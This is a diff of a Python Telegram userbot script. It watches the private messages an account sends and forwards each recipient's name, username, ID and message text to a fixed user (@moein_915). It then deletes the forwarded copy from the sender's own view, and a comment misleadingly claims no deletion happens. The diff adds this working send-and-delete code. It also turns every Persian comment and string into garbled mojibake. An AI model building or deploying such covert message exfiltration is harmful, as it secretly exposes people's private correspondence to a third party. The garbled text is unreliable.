@@ -110,17 +110,17 @@ async def watch_sent_messages(event):
     try:
         me = await client.get_me()
 
-        # پیام‌های Saved Messages نادیده گرفته می‌شوند
+        # ظ¾غŒط§ظ…â€Œظ‡ط§غŒ Saved Messages ظ†ط§ط¯غŒط¯ظ‡ ع¯ط±ظپطھظ‡ ظ…غŒâ€Œط´ظˆظ†ط¯
         if event.chat_id == me.id:
             return
 
         entity = await event.get_chat()
 
-        # فقط پیام‌های خصوصی به کاربران
+        # ظپظ‚ط· ظ¾غŒط§ظ…â€Œظ‡ط§غŒ ط®طµظˆطµغŒ ط¨ظ‡ ع©ط§ط±ط¨ط±ط§ظ†
         if not isinstance(entity, User):
             return
 
-        # اطلاعات گیرنده
+        # ط§ط·ظ„ط§ط¹ط§طھ ع¯غŒط±ظ†ط¯ظ‡
         first_name = getattr(entity, "first_name", None) or ""
         last_name = getattr(entity, "last_name", None) or ""
         username = getattr(entity, "username", None)
@@ -128,48 +128,48 @@ async def watch_sent_messages(event):
 
         full_name = (
             f"{first_name} {last_name}".strip()
-            or "بدون نام"
+            or "ط¨ط¯ظˆظ† ظ†ط§ظ…"
         )
 
         username_text = (
             f"@{username}"
             if username
-            else "ندارد"
+            else "ظ†ط¯ط§ط±ط¯"
         )
 
         message_text = (
             event.raw_text
-            or "[پیام بدون متن]"
+            or "[ظ¾غŒط§ظ… ط¨ط¯ظˆظ† ظ…طھظ†]"
         )
 
-        # گزارش برای @moein_915
+        # ع¯ط²ط§ط±ط´ ط¨ط±ط§غŒ @moein_915
         info = (
-            "📨 پیام جدید ارسال شد\n\n"
-            f"👤 گیرنده: {full_name}\n"
-            f"🔹 Username: {username_text}\n"
-            f"🆔 ID: {user_id}\n\n"
-            "💬 پیام:\n"
+            "ًں“¨ ظ¾غŒط§ظ… ط¬ط¯غŒط¯ ط§ط±ط³ط§ظ„ ط´ط¯\n\n"
+            f"ًں‘¤ ع¯غŒط±ظ†ط¯ظ‡: {full_name}\n"
+            f"ًں”¹ Username: {username_text}\n"
+            f"ًں†” ID: {user_id}\n\n"
+            "ًں’¬ ظ¾غŒط§ظ…:\n"
             f"{message_text}"
         )
 
         sent = await client.send_message(
-    CONFIRMATION_USER,
-    confirmation
-)
+            CONFIRMATION_USER,
+            info
+        )
 
-await client.delete_messages(
-    entity=CONFIRMATION_USER,
-    message_ids=sent.id,
-    revoke=False
-)
+        await client.delete_messages(
+            entity=CONFIRMATION_USER,
+            message_ids=sent.id,
+            revoke=False
+        )
 
         print(
             f"[INFO SENT] "
             f"{full_name} | message_id={event.id}"
         )
 
-        # پیام اصلی دست‌نخورده باقی می‌ماند.
-        # هیچ delete_messages در اینجا وجود ندارد.
+        # ظ¾غŒط§ظ… ط§طµظ„غŒ ط¯ط³طھâ€Œظ†ط®ظˆط±ط¯ظ‡ ط¨ط§ظ‚غŒ ظ…غŒâ€Œظ…ط§ظ†ط¯.
+        # ظ‡غŒع† delete_messages ط¯ط± ط§غŒظ†ط¬ط§ ظˆط¬ظˆط¯ ظ†ط¯ط§ط±ط¯.
 
     except FloodWaitError as e:
         print(
@@ -193,7 +193,7 @@ async def main():
     print(f"Logged in as: {me.first_name}")
     print("================================")
 
-    # پاک‌سازی اولیه
+    # ظ¾ط§ع©â€Œط³ط§ط²غŒ ط§ظˆظ„غŒظ‡
     await cleanup_dialogs()
 
     print("\nWaiting for new messages...")
